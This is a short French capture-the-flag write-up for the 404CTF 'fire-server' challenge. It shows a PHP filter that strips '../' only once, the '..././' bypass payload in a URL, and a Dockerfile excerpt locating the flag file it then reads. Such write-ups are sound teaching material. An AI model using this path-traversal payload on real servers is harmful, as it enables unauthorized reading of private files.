En lisant de près index.php on remarque qu'il n'y a qu'un seul filtre sur la commande que l'on passe dans le GET

```php
$decodedPath = str_replace("../", "", $decodedPath);
```

filtre qui est facilement bypassable avec une url du style

```bash
https://fire-server.404ctf.fr/?path=..././..././..././
```

de plus en regardant de plus près ce qui se passe dans le [Dockerfile](/fire-server/Dockerfile)

on remarque cette première commande qui contient un substitue du flag, nous indiquant dans quelle fichier se trouvera le vrai sur l'URL du challenge

```bash
RUN mkdir -p /var/files/classified && \
    echo "Mission Selenium – Niveau 5 Confidentiel\nAnalyse de l’organisme prélevé sur la face cachée lunaire : activité bioélectrique persistante.\nExpérimentations poursuivies malgré les objections éthiques.\n404CTF{fakeflag}" \
    > /var/files/classified/selenium && \
    chmod 640 /var/files/classified/selenium && \
    chown www-data:www-data /var/files/classified/selenium
```

ni une ni deux

```bash
https://fire-server.404ctf.fr/?path=..././..././..././var/files/classified/selenium
```

et hope ! le flag


![flag](/img/flag.png)